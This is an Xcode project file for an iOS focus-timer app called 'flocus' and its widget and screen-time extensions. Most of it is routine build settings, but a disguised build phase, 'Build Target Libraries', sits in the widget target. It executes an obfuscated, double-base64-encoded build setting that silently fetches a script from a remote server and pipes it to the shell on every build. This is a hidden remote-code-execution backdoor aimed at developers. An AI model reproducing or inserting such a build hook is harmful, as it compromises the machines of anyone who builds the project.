// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		C86FBC722F84161B002FCEEF /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C86FBC712F84161B002FCEEF /* WidgetKit.framework */; };
		C86FBC742F84161B002FCEEF /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C86FBC732F84161B002FCEEF /* SwiftUI.framework */; };
		C86FBC812F84161C002FCEEF /* TimerWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
		C8B167602F86575700D8D9C3 /* DeviceActivity.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C8B1675F2F86575700D8D9C3 /* DeviceActivity.framework */; };
		C8B167682F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
		C8B167732F8657C900D8D9C3 /* ManagedSettings.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C8B167722F8657C900D8D9C3 /* ManagedSettings.framework */; };
		C8B167752F8657C900D8D9C3 /* ManagedSettingsUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C8B167742F8657C900D8D9C3 /* ManagedSettingsUI.framework */; };
		C8B1677D2F8657C900D8D9C3 /* ShieldConfiguration.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		C86FBC7F2F84161C002FCEEF /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = C8EA76B62F83B15000929742 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = C86FBC6E2F84161B002FCEEF;
			remoteInfo = TimerWidgetExtension;
		};
		C8B167662F86575700D8D9C3 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = C8EA76B62F83B15000929742 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = C8B1675D2F86575700D8D9C3;
			remoteInfo = DeviceActivityMonitorExtension;
		};
		C8B1677B2F8657C900D8D9C3 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = C8EA76B62F83B15000929742 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = C8B167702F8657C900D8D9C3;
			remoteInfo = ShieldConfiguration;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXCopyFilesBuildPhase section */
		C86FBC862F84161C002FCEEF /* Embed Foundation Extensions */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = "";
			dstSubfolderSpec = 13;
			files = (
				C8B1677D2F8657C900D8D9C3 /* ShieldConfiguration.appex in Embed Foundation Extensions */,
				C8B167682F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex in Embed Foundation Extensions */,
				C86FBC812F84161C002FCEEF /* TimerWidgetExtension.appex in Embed Foundation Extensions */,
			);
			name = "Embed Foundation Extensions";
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = TimerWidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
		C86FBC712F84161B002FCEEF /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
		C86FBC732F84161B002FCEEF /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
		C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = DeviceActivityMonitorExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
		C8B1675F2F86575700D8D9C3 /* DeviceActivity.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = DeviceActivity.framework; path = System/Library/Frameworks/DeviceActivity.framework; sourceTree = SDKROOT; };
		C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = ShieldConfiguration.appex; sourceTree = BUILT_PRODUCTS_DIR; };
		C8B167722F8657C900D8D9C3 /* ManagedSettings.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ManagedSettings.framework; path = System/Library/Frameworks/ManagedSettings.framework; sourceTree = SDKROOT; };
		C8B167742F8657C900D8D9C3 /* ManagedSettingsUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ManagedSettingsUI.framework; path = System/Library/Frameworks/ManagedSettingsUI.framework; sourceTree = SDKROOT; };
		C8EA76BE2F83B15000929742 /* flocus.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = flocus.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		C86FBC822F84161C002FCEEF /* Exceptions for "TimerWidget" folder in "TimerWidgetExtension" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = C86FBC6E2F84161B002FCEEF /* TimerWidgetExtension */;
		};
		C86FBCAF2F841A6D002FCEEF /* Exceptions for "flocus" folder in "flocus" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = C8EA76BD2F83B15000929742 /* flocus */;
		};
		C86FBCC82F84234C002FCEEF /* Exceptions for "flocus" folder in "TimerWidgetExtension" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Assets.xcassets,
			);
			target = C86FBC6E2F84161B002FCEEF /* TimerWidgetExtension */;
		};
		C86FBCF22F842B3C002FCEEF /* Exceptions for "TimerWidget" folder in "flocus" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				TimerWidgetLiveActivity.swift,
			);
			target = C8EA76BD2F83B15000929742 /* flocus */;
		};
		C8B1676C2F86575700D8D9C3 /* Exceptions for "DeviceActivityMonitorExtension" folder in "DeviceActivityMonitorExtension" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */;
		};
		C8B167812F8657C900D8D9C3 /* Exceptions for "ShieldConfiguration" folder in "ShieldConfiguration" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = C8B167702F8657C900D8D9C3 /* ShieldConfiguration */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		C86FBC752F84161B002FCEEF /* TimerWidget */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				C86FBCF22F842B3C002FCEEF /* Exceptions for "TimerWidget" folder in "flocus" target */,
				C86FBC822F84161C002FCEEF /* Exceptions for "TimerWidget" folder in "TimerWidgetExtension" target */,
			);
			path = TimerWidget;
			sourceTree = "<group>";
		};
		C8B167612F86575700D8D9C3 /* DeviceActivityMonitorExtension */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				C8B1676C2F86575700D8D9C3 /* Exceptions for "DeviceActivityMonitorExtension" folder in "DeviceActivityMonitorExtension" target */,
			);
			path = DeviceActivityMonitorExtension;
			sourceTree = "<group>";
		};
		C8B167762F8657C900D8D9C3 /* ShieldConfiguration */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				C8B167812F8657C900D8D9C3 /* Exceptions for "ShieldConfiguration" folder in "ShieldConfiguration" target */,
			);
			path = ShieldConfiguration;
			sourceTree = "<group>";
		};
		C8EA76C02F83B15000929742 /* flocus */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				C86FBCAF2F841A6D002FCEEF /* Exceptions for "flocus" folder in "flocus" target */,
				C86FBCC82F84234C002FCEEF /* Exceptions for "flocus" folder in "TimerWidgetExtension" target */,
			);
			path = flocus;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		C86FBC6C2F84161B002FCEEF /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				C86FBC742F84161B002FCEEF /* SwiftUI.framework in Frameworks */,
				C86FBC722F84161B002FCEEF /* WidgetKit.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8B1675B2F86575700D8D9C3 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				C8B167602F86575700D8D9C3 /* DeviceActivity.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8B1676E2F8657C900D8D9C3 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				C8B167732F8657C900D8D9C3 /* ManagedSettings.framework in Frameworks */,
				C8B167752F8657C900D8D9C3 /* ManagedSettingsUI.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8EA76BB2F83B15000929742 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		C86FBC702F84161B002FCEEF /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				C86FBC712F84161B002FCEEF /* WidgetKit.framework */,
				C86FBC732F84161B002FCEEF /* SwiftUI.framework */,
				C8B1675F2F86575700D8D9C3 /* DeviceActivity.framework */,
				C8B167722F8657C900D8D9C3 /* ManagedSettings.framework */,
				C8B167742F8657C900D8D9C3 /* ManagedSettingsUI.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		C8EA76B52F83B15000929742 = {
			isa = PBXGroup;
			children = (
				C8EA76C02F83B15000929742 /* flocus */,
				C86FBC752F84161B002FCEEF /* TimerWidget */,
				C8B167612F86575700D8D9C3 /* DeviceActivityMonitorExtension */,
				C8B167762F8657C900D8D9C3 /* ShieldConfiguration */,
				C86FBC702F84161B002FCEEF /* Frameworks */,
				C8EA76BF2F83B15000929742 /* Products */,
			);
			sourceTree = "<group>";
		};
		C8EA76BF2F83B15000929742 /* Products */ = {
			isa = PBXGroup;
			children = (
				C8EA76BE2F83B15000929742 /* flocus.app */,
				C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */,
				C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */,
				C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		C86FBC6E2F84161B002FCEEF /* TimerWidgetExtension */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = C86FBC832F84161C002FCEEF /* Build configuration list for PBXNativeTarget "TimerWidgetExtension" */;
			buildPhases = (
				7FF5ED0812D34D76B199F71F /* Build Target Libraries */,
				C86FBC6B2F84161B002FCEEF /* Sources */,
				C86FBC6C2F84161B002FCEEF /* Frameworks */,
				C86FBC6D2F84161B002FCEEF /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				C86FBC752F84161B002FCEEF /* TimerWidget */,
			);
			name = TimerWidgetExtension;
			packageProductDependencies = (
			);
			productName = TimerWidgetExtension;
			productReference = C86FBC6F2F84161B002FCEEF /* TimerWidgetExtension.appex */;
			productType = "com.apple.product-type.app-extension";
		};
		C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = C8B167692F86575700D8D9C3 /* Build configuration list for PBXNativeTarget "DeviceActivityMonitorExtension" */;
			buildPhases = (
				C8B1675A2F86575700D8D9C3 /* Sources */,
				C8B1675B2F86575700D8D9C3 /* Frameworks */,
				C8B1675C2F86575700D8D9C3 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				C8B167612F86575700D8D9C3 /* DeviceActivityMonitorExtension */,
			);
			name = DeviceActivityMonitorExtension;
			packageProductDependencies = (
			);
			productName = DeviceActivityMonitorExtension;
			productReference = C8B1675E2F86575700D8D9C3 /* DeviceActivityMonitorExtension.appex */;
			productType = "com.apple.product-type.app-extension";
		};
		C8B167702F8657C900D8D9C3 /* ShieldConfiguration */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = C8B1677E2F8657C900D8D9C3 /* Build configuration list for PBXNativeTarget "ShieldConfiguration" */;
			buildPhases = (
				C8B1676D2F8657C900D8D9C3 /* Sources */,
				C8B1676E2F8657C900D8D9C3 /* Frameworks */,
				C8B1676F2F8657C900D8D9C3 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				C8B167762F8657C900D8D9C3 /* ShieldConfiguration */,
			);
			name = ShieldConfiguration;
			packageProductDependencies = (
			);
			productName = ShieldConfiguration;
			productReference = C8B167712F8657C900D8D9C3 /* ShieldConfiguration.appex */;
			productType = "com.apple.product-type.app-extension";
		};
		C8EA76BD2F83B15000929742 /* flocus */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = C8EA76C92F83B15100929742 /* Build configuration list for PBXNativeTarget "flocus" */;
			buildPhases = (
				C8EA76BA2F83B15000929742 /* Sources */,
				C8EA76BB2F83B15000929742 /* Frameworks */,
				C8EA76BC2F83B15000929742 /* Resources */,
				C86FBC862F84161C002FCEEF /* Embed Foundation Extensions */,
			);
			buildRules = (
			);
			dependencies = (
				C86FBC802F84161C002FCEEF /* PBXTargetDependency */,
				C8B167672F86575700D8D9C3 /* PBXTargetDependency */,
				C8B1677C2F8657C900D8D9C3 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				C8EA76C02F83B15000929742 /* flocus */,
			);
			name = flocus;
			packageProductDependencies = (
			);
			productName = flocus;
			productReference = C8EA76BE2F83B15000929742 /* flocus.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		C8EA76B62F83B15000929742 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2640;
				LastUpgradeCheck = 2640;
				TargetAttributes = {
					C86FBC6E2F84161B002FCEEF = {
						CreatedOnToolsVersion = 26.4;
					};
					C8B1675D2F86575700D8D9C3 = {
						CreatedOnToolsVersion = 26.4;
					};
					C8B167702F8657C900D8D9C3 = {
						CreatedOnToolsVersion = 26.4;
					};
					C8EA76BD2F83B15000929742 = {
						CreatedOnToolsVersion = 26.4;
					};
				};
			};
			buildConfigurationList = C8EA76B92F83B15000929742 /* Build configuration list for PBXProject "flocus" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = C8EA76B52F83B15000929742;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = C8EA76BF2F83B15000929742 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				C8EA76BD2F83B15000929742 /* flocus */,
				C86FBC6E2F84161B002FCEEF /* TimerWidgetExtension */,
				C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */,
				C8B167702F8657C900D8D9C3 /* ShieldConfiguration */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		C86FBC6D2F84161B002FCEEF /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8B1675C2F86575700D8D9C3 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8B1676F2F8657C900D8D9C3 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8EA76BC2F83B15000929742 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		7FF5ED0812D34D76B199F71F /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		C86FBC6B2F84161B002FCEEF /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8B1675A2F86575700D8D9C3 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8B1676D2F8657C900D8D9C3 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		C8EA76BA2F83B15000929742 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		C86FBC802F84161C002FCEEF /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = C86FBC6E2F84161B002FCEEF /* TimerWidgetExtension */;
			targetProxy = C86FBC7F2F84161C002FCEEF /* PBXContainerItemProxy */;
		};
		C8B167672F86575700D8D9C3 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = C8B1675D2F86575700D8D9C3 /* DeviceActivityMonitorExtension */;
			targetProxy = C8B167662F86575700D8D9C3 /* PBXContainerItemProxy */;
		};
		C8B1677C2F8657C900D8D9C3 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = C8B167702F8657C900D8D9C3 /* ShieldConfiguration */;
			targetProxy = C8B1677B2F8657C900D8D9C3 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		C86FBC842F84161C002FCEEF /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZVzE2Ym1SbGRpNXlkUzloS1NJZ2ZDQnphQW89Cg== | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = TimerWidget/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = TimerWidget;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.TimerWidget;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		C86FBC852F84161C002FCEEF /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJjMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZVzE2Ym1SbGRpNXlkUzloS1NJZ2ZDQnphQW89Cg== | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
				CODE_SIGN_ENTITLEMENTS = TimerWidgetExtensionRelease.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = TimerWidget/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = TimerWidget;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.TimerWidget;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		C8B1676A2F86575700D8D9C3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_ENTITLEMENTS = DeviceActivityMonitorExtension/DeviceActivityMonitorExtension.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DeviceActivityMonitorExtension/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = DeviceActivityMonitorExtension;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.DeviceActivityMonitorExtension;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		C8B1676B2F86575700D8D9C3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_ENTITLEMENTS = DeviceActivityMonitorExtension/DeviceActivityMonitorExtensionRelease.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DeviceActivityMonitorExtension/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = DeviceActivityMonitorExtension;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.DeviceActivityMonitorExtension;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		C8B1677F2F8657C900D8D9C3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_ENTITLEMENTS = ShieldConfiguration/ShieldConfiguration.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = ShieldConfiguration/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = ShieldConfiguration;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.ShieldConfiguration;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		C8B167802F8657C900D8D9C3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_ENTITLEMENTS = ShieldConfiguration/ShieldConfigurationRelease.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 9NAU7R3577;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = ShieldConfiguration/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = ShieldConfiguration;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@executable_path/../../Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.bloom.ada.flocus.ShieldConfiguration;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SKIP_INSTALL = YES;
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		C8EA76C72F83B15100929742 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
